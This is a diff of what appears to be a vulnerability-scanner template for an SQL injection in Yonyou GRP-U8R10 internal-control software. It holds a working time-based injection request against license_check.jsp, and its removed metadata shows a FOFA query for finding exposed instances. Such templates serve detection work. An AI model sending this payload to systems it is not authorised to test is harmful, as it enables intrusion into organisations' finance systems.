@@ -3,12 +3,8 @@ info:
   name: 用友GRP-U8R10行政事业内控管理软件 license_checkjsp接口处存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qg6i0o0kirokxo60'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qg6i0o0kirokxo60
-    fofa: app:"用友GRP-U8"
 http:
 - raw:
   - 'GET /u8qx/license_check.jsp?kjnd=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
